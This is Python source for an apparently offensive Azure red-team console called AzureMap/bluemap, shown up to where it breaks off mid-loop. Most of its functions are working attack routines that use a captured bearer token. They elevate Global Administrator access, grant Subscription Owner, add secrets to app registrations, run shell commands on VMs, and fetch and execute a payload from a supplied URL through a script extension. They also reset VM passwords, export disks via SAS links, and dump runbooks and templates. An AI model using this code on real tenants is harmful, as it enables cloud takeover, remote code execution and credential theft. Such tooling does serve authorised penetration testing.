import requests
import readline
import base64
import json, sys
import uuid
import os
import random
import string
from prettytable import PrettyTable
import subprocess
from urllib.parse import urlparse

Token = None
accessTokenGraph = None
TotalTargets = []
TargetSubscription = None
TargetTenantId = None
ExploitChoosen = None
hasGraphAccess = False
hasMgmtAccess = False
hasVaultEnabled = False


class SimpleCompleter(object):

    def __init__(self, options):
        self.options = sorted(options)
        return

    def complete(self, text, state):
        response = None
        if state == 0:
            # This is the first time for this text, so build a match list.
            if text:
                self.matches = [s
                                for s in self.options
                                if s and s.startswith(text)]
            else:
                self.matches = self.options[:]

        # Return the state'th item from the match list,
        # if we have that many.
        try:
            response = self.matches[state]
        except IndexError:
            response = None
        return response

def get_random_string(size):
    chars = string.ascii_lowercase+string.ascii_uppercase+string.digits
    ''.join(random.choice(chars) for _ in range(size))
    return chars

def parseUPN():
    global Token
    if Token is None:
        print("No Token has been set.")
    else:
        b64_string = Token.split(".")[1]
        b64_string += "=" * ((4 - len(Token.split(".")[1].strip()) % 4) % 4)
        return json.loads(base64.b64decode(b64_string))['upn']

def parseUPNObjectId():
    global Token
    if Token is None:
        print("No Token has been set.")
    else:
        b64_string = Token.split(".")[1]
        b64_string += "=" * ((4 - len(Token.split(".")[1].strip()) % 4) % 4)
        return json.loads(base64.b64decode(b64_string))['oid']
def hasTokenInPlace():
    global Token
    if Token is None:
        return False
    else:
        return True

def setToken(token):
    global Token, hasMgmtAccess, hasGraphAccess, hasVaultEnabled
    if token == "":
        hasMgmtAccess = False
        hasGraphAccess = False
        hasVaultEnabled = False
    else:
        Token = token


def initToken(token, resetscopes):
    global Token, hasMgmtAccess, hasGraphAccess, hasVaultEnabled
    if resetscopes:
        hasMgmtAccess = False
        hasGraphAccess = False
        hasVaultEnabled = False
    Token = token


def originitToken(token):
    check = token.split(".")[1]
    audAttribue = json.loads(base64.b64decode(check))['aud']
    if audAttribue != "https://management.azure.com/":
        print(
            "ERROR: Invalid audiance in token, please generate a token with correct audiance. Expected: https://management.azure.com/, provided " + audAttribue + " .")
        sys.exit(-1)
    else:
        print("All set.")
        global Token, hasMgmtAccess
        hasMgmtAccess = True
        Token = token


def currentScope():
    global hasMgmtAccess, hasGraphAccess, hasVaultEnabled
    global Token
    if Token is None:
        print("No Token has been set.")
    else:
        check = Token.split(".")[1]
        audAttribue = json.loads(base64.b64decode(check))['aud']
        strA = []
        if hasGraphAccess or "graph.microsoft.com" in audAttribue:
            strA.append("Graph enabled")
        if hasMgmtAccess or "management.azure.com" in audAttribue:
            strA.append("Azure RABC enabled")
        if hasVaultEnabled or 'vault.azure.net' in audAttribue:
            strA.append("Vault enabled")
        print("Enabled Scope(s): " + str(" | ").join(strA))

def currentProfile():
    global Token
    if Token is None:
        print("No Token has been set.")
    else:
        strigify = parseUPN().split("@")
        if Token == None:
            print("Please load a token.")
        else:
            print(strigify[1] + "\\" + strigify[0])

def RD_ListAllUsers():
    global accessTokenGraph
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + accessTokenGraph
    }
    r = requests.get("https://graph.microsoft.com/v1.0/users/",
                     headers=headers)
    return r.json()


'''
This attack path exploits the Global Administrator to modify privileges to Azure Resources
Useful when the account has only access to Azure AD, and no access to Azure Subscriptions
@required_privilege: Global Administrator
@success: No output from API
'''
def GA_ElevateAccess():
    global Token
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + Token
    }
    r = requests.post(
        "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01",
        headers=headers)
    result = r.text
    if result == "":
        return "Exploit Success!"
    else:
        return "Exploit Failed."

'''
This API help to abuse Global Administrator with privileges to Azure Resources to assign Owner subscription privileges
@required_privilege: Global Administrator w/Azure Resources privileges
@success: Response Context
'''
def GA_AssignSubscriptionOwnerRole(subscriptionId):
    global Token
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + Token
    }
    r = requests.put(
        "https://management.azure.com/subscriptions/"+subscriptionId+"/providers/Microsoft.Authorization/roleAssignments/"+str(uuid.uuid4())+"?api-version=2015-07-01",
        json={
              "properties": {
                "roleDefinitionId": "/subscriptions/"+subscriptionId+"/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635",
                "principalId": str(parseUPNObjectId())
              }
            },
        headers=headers)
    result = r.json()
    if result['error']:
        return "Exploit Failed. Abort."
    else:
        return "Exploit Completed! You're Subscription Owner on SubscriptionId=" + str(subscriptionId)


def RD_AddAppSecret():
    global accessTokenGraph
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + accessTokenGraph
    }
    r = requests.get(
        "https://graph.microsoft.com/v1.0/applications",
        headers=headers)
    result = r.json()
    return result

def getResGroup(subid):
    global Token
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + Token
    }
    r = requests.get("https://management.azure.com/subscriptions/"+subid+"/resourcegroups?api-version=2021-04-01",headers=headers)
    return r.json()


def getArmTempPerResGroup(subid,resgroup):
    global Token
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + Token
    }
    r = requests.get("https://management.azure.com/subscriptions/"+subid+"/resourcegroups/"+resgroup+"/providers/Microsoft.Resources/deployments/?api-version=2021-04-01",headers=headers)
    return r.json()

def RD_ListExposedWebApps():
    global Token
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + Token
    }
    rs = requests.get("https://management.azure.com/subscriptions/?api-version=2017-05-10", headers=headers)
    for sub in rs.json()['value']:
        r = requests.get(
            "https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/providers/Microsoft.Web/sites?api-version=2022-03-01",
            headers=headers)
        return r.json()
    return False

def RD_ListAllACRs():
    global Token
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + Token
    }
    rs = requests.get("https://management.azure.com/subscriptions/?api-version=2017-05-10", headers=headers)
    for sub in rs.json()['value']:
        r = requests.get(
            "https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/providers/Microsoft.ContainerRegistry/registries?api-version=2019-05-01",
            headers=headers)
        return r.json()
    return False

def HLP_GetVMInstanceView(subscriptionId,resourceGroupName,vmName):
    global Token
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + Token
    }
    rs = requests.get("https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Compute/virtualMachines/"+vmName+"/instanceView?api-version=2022-08-01", headers=headers)
    if rs.status_code == 200:
        return rs.json()['statuses'][1]['code']
    else:
        print(rs.json())
        return "Unable to fetch VM data."

def RD_ListAllVMs():
    global Token
    result = []
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + Token
    }
    rs = requests.get("https://management.azure.com/subscriptions/?api-version=2017-05-10", headers=headers)
    for sub in rs.json()['value']:
        for res in getResGroup(sub['subscriptionId'])['value']:
            rsVM = requests.get("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.Compute/virtualMachines?api-version=2022-08-01", headers=headers)
            for item in rsVM.json()['value']:
                if 'identity' not in item:
                    item['identity'] = "N/A"

                item['subscriptionId'] = sub['subscriptionId']
                item['resourceGroup'] = res['name']
                result.append(item)
    return result
def CON_GenerateVMDiskSAS(subscriptionId, resourceGroupName, vmDiskName, location):
    global Token
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + Token
    }
    rs = requests.post("https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Compute/disks/"+vmDiskName+"/beginGetAccess?api-version=2022-03-02",
                      json={
                          "access": "read",
                          "durationInSeconds": 86400
                      },
                      headers=headers)

    if rs.status_code == 202:
        rsAsync = requests.get(str(rs.headers['Location']),headers=headers)
        return "Disk Ready! The SAS Download For the next 24 hours (Disk:" + vmDiskName + "): " + rsAsync.json()['accessSAS']
    else:
        return "Failed to generate SAS link for Disk."

def CON_VMExtensionExecution(subscriptionId, location, resourceGroupName, vmName, PayloadURL):
    global Token
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + Token
    }
    vmExtensionName = get_random_string(20)
    r = requests.put(
        "https://management.azure.com/subscriptions/" + subscriptionId + "/resourceGroups/" + resourceGroupName + "/providers/Microsoft.Compute/virtualMachines/" + vmName + "/extensions/" + vmExtensionName + "?api-version=2022-08-01",
        json={
            "location": location,
            "properties": {
                "publisher": "Microsoft.Compute",
                "typeHandlerVersion": "1.0",
                "type": "CustomScriptExtension",
                "autoUpgradeMinorVersion": True,
                "protectedSettings": {
                    "commandToExecute": os.path.basename(urlparse(PayloadURL).path),
                    "fileUris": [PayloadURL]
                }
            }
        },
        headers=headers)
    if r.status_code == 201:
        return "Created! It should be ready within 5-10 min."
    else:
        return "Failed to create VM Extension.\nReason: " + str(r.json()['error']['message'])

def CON_VMRunCommand(subscriptionId, resourceGroupName, osType, vmName, Command):
    global Token
    headers = {
        'Content-Type': 'text/json',
        'Authorization': 'Bearer ' + Token
    }
    if osType == "Windows":
        exec = "RunPowerShellScript"
    else:
        exec = "RunShellScript"

    rs = requests.post("https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Compute/virtualMachines/"+vmName+"/runCommand?api-version=2022-08-01",
        json={
            "commandId": exec,
            "script": [Command]
        }, headers=headers)

    if rs.status_code == 202 or rs.status_code == 200:
        return "Successfully Created Shell Script."
    else:
        return "Failed to Create Shell Script."



def CON_VMExtensionResetPwd(subscriptionId, location, resourceGroupName, vmName, vmExtensionName, adminAccount):
    global Token
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + Token
    }
    vmExtensionName = get_random_string(20)
    r = requests.put(
        "https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Compute/virtualMachines/"+vmName+"/extensions/"+vmExtensionName+"?api-version=2022-08-01",
        json={
              "location": location,
              "properties": {
                "publisher": "Microsoft.Compute",
                "typeHandlerVersion": "2.0",
                "type": "VMAccessAgent",
                "autoUpgradeMinorVersion": True,
                "protectedSettings": {
                    "password": "secretPass123"
                }
              }
            },
        headers=headers)
    if r.status_code == 201:
        return "Created! It should be ready within 5-10 min. \nLogin to "+vmName+" using " + adminAccount + ":secretPass123 as login details."
    else:
        return "Failed to create VM Extension.\nReason: " + str(r.json()['error']['message'])

def RD_ListAutomationAccounts():
    global Token
    result = []
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + Token
    }
    rs = requests.get("https://management.azure.com/subscriptions/?api-version=2017-05-10", headers=headers)
    for sub in rs.json()['value']:
        r = requests.get(
            "https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/providers/Microsoft.Automation/automationAccounts?api-version=2021-06-22",
            headers=headers)
        for item in r.json()['value']:
            item['subscriptionId'] = sub['subscriptionId']
            result.append(item)
    return result

def RD_ListRunBooksByAutomationAccounts():
    global Token
    result = []
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + Token
    }
    rs = requests.get("https://management.azure.com/subscriptions/?api-version=2017-05-10", headers=headers)
    for sub in rs.json()['value']:
        pathToAutomationAccount = requests.get(
            "https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/providers/Microsoft.Automation/automationAccounts?api-version=2021-06-22",
            headers=headers)
        for automationAccount in pathToAutomationAccount.json()['value']:
            GetRunBook = requests.get("https://management.azure.com/" + str(automationAccount['id']) + "/runbooks?api-version=2019-06-01",headers=headers)
            for item in GetRunBook.json()['value']:
                item['subscriptionId'] = str(sub['subscriptionId'])
                item['automationAccount'] = str(automationAccount['name'])
                result.append(item)
    return result

def RD_ListARMTemplates():
    global Token

    finalResult = []
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + Token
    }

    rs = requests.get("https://management.azure.com/subscriptions/?api-version=2017-05-10", headers=headers)
    for sub in rs.json()['value']:
        for res in getResGroup(sub['subscriptionId'])['value']:
            for template in getArmTempPerResGroup(sub['subscriptionId'], res['name'])['value']:
                currenttemplate = template
                currentdata = {'name': currenttemplate['name'], 'id': currenttemplate['id']}
                if 'parameters' in currenttemplate['properties']:
                    currentdata['params'] = currenttemplate['properties']['parameters']
                else:
                    continue
                if 'outputs' in currenttemplate['properties']:
                    currentdata['outputs'] = currenttemplate['properties']['outputs']
                else:
                    continue
                finalResult.append(currentdata)
    return finalResult
def CHK_AppRegOwner(appId):
    global accessTokenGraph
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + accessTokenGraph
    }
    r = requests.get("https://graph.microsoft.com/v1.0/applications?$filter=appId eq '" + appId + "'",
                     headers=headers)
    appData = r.json()['value'][0]['id']
    AppOwners = requests.get("https://graph.microsoft.com/v1.0/applications/" + str(appData) + "/owners",headers=headers)
    if str(parseUPN()) in AppOwners.text:
        return "Yes! Try Exploit: Reader/abuseServicePrincipals"
    else:
        return "N/A"

def RD_addPasswordForEntrepriseApp(appId):
    global accessTokenGraph
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + accessTokenGraph
    }
    r = requests.get("https://graph.microsoft.com/v1.0/applications?$filter=appId eq '" + appId + "'",
                     headers=headers)
    appData = r.json()['value'][0]['id']
    addSecretPwd = requests.post(
        "https://graph.microsoft.com/v1.0/applications/" + str(appData) + "/addPassword",
        json={
            "passwordCredential": {
                "displayName": "Password"
            }
        },
        headers=headers)
    if addSecretPwd.status_code == 200:
        pwdOwn = addSecretPwd.json()
        return "AppId: " + pwdOwn['keyId'] + "| Pwd: " + pwdOwn['secretText']
    else:
        return "N/A"

def tryGetToken():
    global accessTokenGraph, hasGraphAccess, hasMgmtAccess
    try:
        accessToken = None
        add = subprocess.run(["powershell.exe", "-c","az account get-access-token --resource=\"https://management.azure.com/\""], capture_output=True, text=True)
        graph = subprocess.run(["powershell.exe", "-c","az account get-access-token --resource=\"https://graph.microsoft.com/\""], capture_output=True, text=True)
        if 'No subscription found' in add.stderr or graph.stderr:
            print("No subscriptions were found. You will need to switch to tenant-level access manually: az login --allow-no-subscriptions")
            print("Failed generate token. You may need to login or try manually.")
        elif 'Exception' in add.stderr or graph.stderr:
            print("Unable to use azure cli for generating token")
            print("Failed generate token. You may need to login or try manually.")
        elif add.stdout == "" or graph.stdout == "":
            print("Failed generate token. You may need to login or try manually.")
        else:
            hasGraphAccess = True
            hasMgmtAccess = True
            print("Captured token done. All set!")
            jres = json.loads(add.stdout)
            jresgraph = json.loads(graph.stdout)
            accessToken = jres['accessToken']
            accessTokenGraph = jresgraph['accessToken']
        return accessToken
    except:
        return None



def canRoleBeAbused(currentRoleName):
    vaultAbuseRoles = ["Key Vault Secrets Officer", "Key Vault Secrets User", "Key Vault Administrator"]
    vaultAbuseCertAndKeysOnlyRoles = ["Key Vault Certificates Officer", "Key Vault Crypto Officer"]
    shadowRisks = ["Cloud Application Administrator", "Application Administrator", "Password Administrator",
                   "Privileged Authentication Administrator", "Authentication Administrator",
                   "Privileged Role Administrator", "User Account Administrator", "User Administartor",
                   "Helpdesk Administartor"]
    classicAdministartors = ["Account Administrator", "Service Administrator", "Co-Administrator"]
    if currentRoleName in vaultAbuseRoles:
        return currentRoleName + "|" + "allows to retrieve secrets from key vault."
    elif currentRoleName in vaultAbuseCertAndKeysOnlyRoles:
        return currentRoleName + "|" + "allows to retrieve Certifications/Keys ONLY from key vault."
    elif currentRoleName == "Contributor":
        return currentRoleName + "|" + "can manage all Azure services, without the ability to create role assignments."
    elif currentRoleName == "Reader":
        return currentRoleName + "|" + "allows to read data of the resource."
    elif currentRoleName == "Global Reader":
        return currentRoleName + "|" + "Can read everything in Azure AD, without the ability to update."
    elif currentRoleName == "Global Administrator" or currentRoleName == "Company Administrator":
        return currentRoleName + "|" + "has a god mode, which can manage all aspects of Azure AD. (think like Domain Admin)"
    elif currentRoleName == "Virtual Machine Contributor":
        return currentRoleName + "|" + "allows manage of VMs including disks, snapshots, extensions, and password restoration."
    elif currentRoleName == "Automation Operator" or currentRoleName == "Automation Contributor":
        return currentRoleName + "|" + "allows create and manage jobs, and read runbook names and properties for all runbooks in an Automation account."
    elif currentRoleName == "Storage Blob Data Reader":
        return currentRoleName + "|" + "allows read, write, and delete storage containers and blobs."
    elif currentRoleName == "User Access Administrator":
        return currentRoleName + "|" + "has manage access to all resources within the subscription."
    elif currentRoleName in shadowRisks:
        return currentRoleName + "|" + " has full directory admin rights, easy way to esclate."
    elif currentRoleName in classicAdministartors:
        return currentRoleName + "|" + "Is found as one of the three classic subscription administrative roles. Please notice: Service Administrator and Account Administrator are equivalent to the Owner role in the subscription."
    elif currentRoleName == "Owner":
        return currentRoleName + "|" + "has high privlieged permission, allows to esclate to subscription/tenat level via given resource."
    return False


def canPermissionBeAbused(currentPermission):
    vmPermissions = ["Microsoft.Compute/virtualMachines/runCommand/action",
                     "Microsoft.Compute/virtualMachines/extensions/*"]
    vmAllowDeployPermission = ["Microsoft.Compute/virtualMachines/write"]
    AutomationAccounts = ["Microsoft.Automation/automationAccounts/*",
                          "Microsoft.Automation/automationAccounts/jobs/write",
                          "Microsoft.Automation/automationAccounts/jobSchedules/write"]
    AutomationAccountsRO = ["Microsoft.Automation/automationAccounts/read",
                            "Microsoft.Automation/automationAccounts/runbooks/read",
                            "Microsoft.Automation/automationAccounts/schedules/read",
                            "Microsoft.Automation/automationAccounts/jobs/read"]
    StorangeAccountAbuse = ["Microsoft.ClassicStorage/storageAccounts/listKeys/action",
                            "Microsoft.Storage/storageAccounts/listKeys/action"]
    ARMTemplateAbuse = ["Microsoft.Resources/deployments/*"]
    DirectoryAbuse = ["Microsoft.Resources/deployments/*"]
    ExtensionsAbuse = ["Microsoft.ClassicCompute/virtualMachines/extensions/*",
                       "Microsoft.Compute/virtualMachines/extensions/read",
                       "Microsoft.Compute/virtualMachines/extensions/write"]
    HybridCompute = ["Microsoft.HybridCompute/machines/extensions/write"]
    AllSubscriptions = ["Microsoft.Resources/subscriptions/resourcegroups/deployments/*"]
    AllowToManageRBAC = ["Microsoft.Authorization/roleAssignments/*", "Microsoft.Authorization/*",
                         "Microsoft.Authorization/*/Write", "Microsoft.Authorization/roleAssignments/*",
                         "Microsoft.Authorization/roleDefinition/*", "Microsoft.Authorization/roleDefinitions/*",
                         "Microsoft.Authorization/elevateAccess/Action", "Microsoft.Authorization/roleDefinition/write",
                         "Microsoft.Authorization/roleDefinitions/write",
                         "Microsoft.Authorization/roleAssignments/write",
                         "Microsoft.Authorization/classicAdministrators/write"]
    if currentPermission == "*":
        return "" + "|" + "That's means to have a Contributor permission on resources."
    elif currentPermission in vmPermissions:
        return currentPermission + "|" + "allows execute code on Virtual Machines."
    elif currentPermission in vmAllowDeployPermission:
        return currentPermission + "|" + "allows VM deployment or configuraiton of existing VM."
    elif currentPermission in StorangeAccountAbuse:
        return currentPermission + "|" + "can abuse storage accounts (i.e., view blobs)."
    elif currentPermission in ARMTemplateAbuse:
        return currentPermission + "|" + "allows create and execute of deployment actions."
    elif all(k in currentPermission for k in
             ("Microsoft.Resources/deployments/read", "Microsoft.Resources/subscriptions/resourceGroups/read")):
        return currentPermission + "|" + "have the ability to view ARM templates and history data."
    elif currentPermission in ExtensionsAbuse or currentPermission in HybridCompute:
        return currentPermission + "|" + "allows abuse of VM extensions. (make sure that you have read + write for Custome Script extenstions)"
    elif currentPermission in AllSubscriptions:
        return currentPermission + "|" + "has permission for all subscriptions."
    elif currentPermission == "*/read":
        return currentPermission + "|" + "has read all permission for data."
    elif currentPermission in AutomationAccounts:
        return currentPermission + "|" + "has ability to create automation account jobs (runbooks)."
    elif currentPermission in AutomationAccountsRO:
        return currentPermission + "|" + "has ability to read automation jobs (runbooks)."
    elif currentPermission == "Microsoft.Authorization/*/read":
        return currentPermission + "|" + "has permission to read roles and role assignments."
    elif currentPermission in AllowToManageRBAC:
        return currentPermission + "|" + "able to preform RBAC operations (i.e., add permissions,roles)."
    return False


def GetAllRoleAssignmentsUnderSubscription(subscriptionId):
    global Token
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + Token
    }
    r = requests.get(
        "https://management.azure.com/subscriptions/" + subscriptionId + "/providers/Microsoft.Authorization/roleAssignments?api-version=2015-07-01",
        headers=headers)
    result = r.json()
    return result

def RD_DumpRunBookContent(runbookGUID):
    global Token
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + Token
    }
    r = requests.get(
        "https://management.azure.com/" + runbookGUID + "/content?api-version=2019-06-01",
        headers=headers)
    if r.status_code == 200:
        result = r.text
    else:
        result = None
    return result

def HLP_GetAzVMPublicIP(subscriptionId,resourceGroupName,publicIpAddressName):
    global Token
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + Token
    }
    r = requests.get(
        "https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Network/publicIPAddresses/"+publicIpAddressName+"PublicIP?api-version=2022-01-01",
        headers=headers)
    if r.status_code == 200:
        if "ipAddress" not in r.json()['properties']:
            result = "N/A"
        else:
            result = r.json()['properties']['ipAddress']
    else:
        result = "N/A"
    return result

def GetAllRoleAssignmentsUnderSubscriptionAndResourceGroup(subscriptionId,resourceGroupId):
    global Token
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + Token
    }
    r = requests.get(
        "https://management.azure.com/subscriptions/" + subscriptionId + "/resourceGroups/"+resourceGroupId+"/providers/Microsoft.Authorization/roleAssignments?api-version=2015-07-01",
        headers=headers)
    result = r.json()
    return result


def GetAllRoleDefinitionsUnderId(roleId):
    global Token
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + Token
    }
    r = requests.get("https://management.azure.com/" + roleId + "?api-version=2015-07-01", headers=headers)
    result = r.json()
    return result


def AboutWindow():
    print("AzureMap v1.0 Developed By Maor Tal (@th3location)")


def getToken():
    return Token

def ListSubscriptionsForToken():
    global Token
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + str(Token)
    }
    r = requests.get("https://management.azure.com/subscriptions/?api-version=2017-05-10", headers=headers)
    result = r.json()
    return result


def GetAllResourcesUnderSubscription(subscriptionId, token):
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + token
    }
    r = requests.get(
        "https://management.azure.com/subscriptions/" + subscriptionId + "/resources?api-version=2017-05-10",
        headers=headers)
    result = r.json()
    return result

def GetAllResourceGroupsUnderSubscription(subscriptionId):
    global Token
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + Token
    }
    r = requests.get(
        "https://management.azure.com/subscriptions/" + subscriptionId + "/resources?api-version=2017-05-10",
        headers=headers)
    result = r.json()
    return result

def attackWindow():
    supportedCommands = [
        "whoami",
        "scopes",
        "get_subs",
        "set_target",
        "get_target",
        "get_resources",
        "get_res",
        "sts",
        "subs",
        "iam full scan",
        "iam roles scan",
        "iam permission scan",
        "show exploits",
        "showtoken",
        "deltoken",
        "run",
        "use",
        "exit",
        "back"
    ]
    exploits = [
        "Token/GenToken",
        "Token/SetToken",
        "Reader/ListAllUsers",
        "Reader/ExposedAppServiceApps",
        "Reader/ListAllAzureContainerRegistry",
        "Reader/ListAutomationAccounts",
        "Reader/DumpAllRunBooks",
        "Reader/ListAllRunBooks",
        "Reader/ListVirtualMachines",
        "Reader/ARMTemplatesDisclosure",
        "Reader/ListServicePrincipal",
        "Reader/abuseServicePrincipals",
        "Contributor/RunCommandVM",
        "Contributor/VMExtensionResetPwd",
        "Contributor/VMExtensionExecution",
        "Contributor/VMDiskExport",
        "GlobalAdministrator/elevateAccess"
    ]
    readline.set_completer(SimpleCompleter(exploits).complete)
    readline.parse_and_bind('tab: complete')
    while (True):
        global TargetSubscription
        global TotalTargets
        global Token
        global ExploitChoosen

        if ExploitChoosen is not None:
            mode = input("$ exploit(" + ExploitChoosen + ") >> ")
        else:
            mode = input("$ bluemap >> ")

        checkCmdInital = mode.split(" ")
        if checkCmdInital[0] not in supportedCommands:
            print("Not supported command. Supported commands: " + str(supportedCommands))
        else:
            if mode == "whoami":
                currentProfile()
            elif mode == "scopes":
                currentScope()
            elif mode == "get_subs" or mode == "subs":
                listSubs = ListSubscriptionsForToken()
                if listSubs.get('value') == None:
                    print("Error occured. Result: " + str(listSubs['error']['message']))
                else:
                    subRecords = PrettyTable()
                    subRecords.align = "l"
                    subRecords.field_names = ["#", "SubscriptionId", "displayName", "State", "Plan", "spendingLimit"]
                    subRecordCount = 0
                    for subRecord in listSubs['value']:
                        subRecords.add_row(
                            [subRecordCount, subRecord['subscriptionId'], subRecord['displayName'], subRecord['state'],
                             subRecord['subscriptionPolicies']['quotaId'],
                             subRecord['subscriptionPolicies']['spendingLimit']])
                        subRecordCount += 1
                        TotalTargets.append(subRecord['subscriptionId'])
                    print(subRecords)
            elif "set_target" in mode or "sts" in mode:
                argSub = mode.split(" ")
                if len(argSub) < 2:
                    print("No subscription has been selected.")
                else:
                    if argSub[1] not in TotalTargets:
                        print("Invalid target subscription.")
                    else:
                        print("Set to target SubscriptionId " + argSub[1])
                        TargetSubscription = argSub[1]
            elif "get_target" in mode:
                print("Current Target SubscriptionId = " + str(TargetSubscription))
            elif "iam full scan" in mode:
                print("Checking all RoleAssignments under SubscriptionId = " + str(TargetSubscription) + "...")
                allRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
                allRolesAssignsRecords = PrettyTable()
                allRolesAssignsRecords.align = "l"
                allRolesAssignsRecordsCount = 0
                allRolesAssignsRecords.field_names = ["#", "RoleName", "Scope", "Can Abused?", "Details"]
                for role in range(0, len(allRolesAssigns)):
                    resultAllRolesAssigns = allRolesAssigns
                    currentRoleInformation = GetAllRoleDefinitionsUnderId(resultAllRolesAssigns['value'][role]['properties']['roleDefinitionId'])
                    currentRoleScope = resultAllRolesAssigns['value'][role]['properties']['scope']
                    currentRoleName = currentRoleInformation['properties']['roleName']
                    allRolesAssignsRecordsCount += 1
                    if canRoleBeAbused(currentRoleName) is not False:
                        allRolesAssignsRecords.add_row([allRolesAssignsRecordsCount, currentRoleName, currentRoleScope, "Yes", canRoleBeAbused(currentRoleName).split("|")[1]])
                    else:
                        allRolesAssignsRecords.add_row([allRolesAssignsRecordsCount, currentRoleName, currentRoleScope, "No", "N/A"])
                print(allRolesAssignsRecords)
                print("\nChecking all RolePermissions under SubscriptionId = " + str(TargetSubscription) + "...")
                allPermRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
                allPermRolesAssignsRecords = PrettyTable()
                allPermRolesAssignsRecords.align = "l"
                allPermRolesAssignsRecordsCount = 0
                allPermRolesAssignsRecords.field_names = ["#", "RoleName", "Permission Assigned", "Can Abused?", "Details"]
                for rolePermission in range(0, len(allPermRolesAssigns)):
                    resultAllRolesAssigns = allPermRolesAssigns
                    currentRolePermissionInformation = GetAllRoleDefinitionsUnderId(
                        resultAllRolesAssigns['value'][rolePermission]['properties']['roleDefinitionId'])
                    currentRolePermissionName = currentRolePermissionInformation['properties']['roleName']
                    currentRolePermissions = currentRolePermissionInformation['properties']['permissions'][0]['actions']
                    for permission in currentRolePermissions:
                        allPermRolesAssignsRecordsCount += 1
                        if canPermissionBeAbused(permission) is not False:
                            allPermRolesAssignsRecords.add_row(
                                [allPermRolesAssignsRecordsCount, currentRolePermissionName, permission, "Yes", canPermissionBeAbused(permission).split("|")[1]])
                        else:
                            allPermRolesAssignsRecords.add_row(
                                [allPermRolesAssignsRecordsCount, currentRolePermissionName, permission, "No", "N/A"])
                print(allPermRolesAssignsRecords)
            elif "iam roles scan" in mode:
                print("Checking all RoleAssignments under SubscriptionId = " + str(TargetSubscription) + "...")
                allRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
                allRolesAssignsRecords = PrettyTable()
                allRolesAssignsRecords.align = "l"
                allRolesAssignsRecordsCount = 0
                allRolesAssignsRecords.field_names = ["#", "RoleName", "Scope", "Can Abused?", "Details"]
                for role in range(0, len(allRolesAssigns)):
                    resultAllRolesAssigns = allRolesAssigns
                    currentRoleInformation = GetAllRoleDefinitionsUnderId(resultAllRolesAssigns['value'][role]['properties']['roleDefinitionId'])
                    currentRoleScope = resultAllRolesAssigns['value'][role]['properties']['scope']
                    currentRoleName = currentRoleInformation['properties']['roleName']
                    allRolesAssignsRecordsCount += 1
                    if canRoleBeAbused(currentRoleName) is not False:
                        allRolesAssignsRecords.add_row([allRolesAssignsRecordsCount, currentRoleName, currentRoleScope, "Yes", canRoleBeAbused(currentRoleName).split("|")[1]])
                    else:
                        allRolesAssignsRecords.add_row([allRolesAssignsRecordsCount, currentRoleName, currentRoleScope, "No", "N/A"])
                print(allRolesAssignsRecords)
            elif "iam permission scan" in mode:
                print("Checking all RolePermissions under SubscriptionId = " + str(TargetSubscription) + "...")
                allPermRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
                allPermRolesAssignsRecords = PrettyTable()
                allPermRolesAssignsRecords.align = "l"
                allPermRolesAssignsRecordsCount = 0
                allPermRolesAssignsRecords.field_names = ["#", "RoleName", "Permission Assigned", "Can Abused?", "Details"]
                for rolePermission in range(0, len(allPermRolesAssigns)):
                    resultAllRolesAssigns = allPermRolesAssigns
                    currentRolePermissionInformation = GetAllRoleDefinitionsUnderId(resultAllRolesAssigns['value'][rolePermission]['properties']['roleDefinitionId'])
                    currentRolePermissionName = currentRolePermissionInformation['properties']['roleName']
                    currentRolePermissions = currentRolePermissionInformation['properties']['permissions'][0]['actions']
                    for permission in currentRolePermissions:
                        allPermRolesAssignsRecordsCount += 1
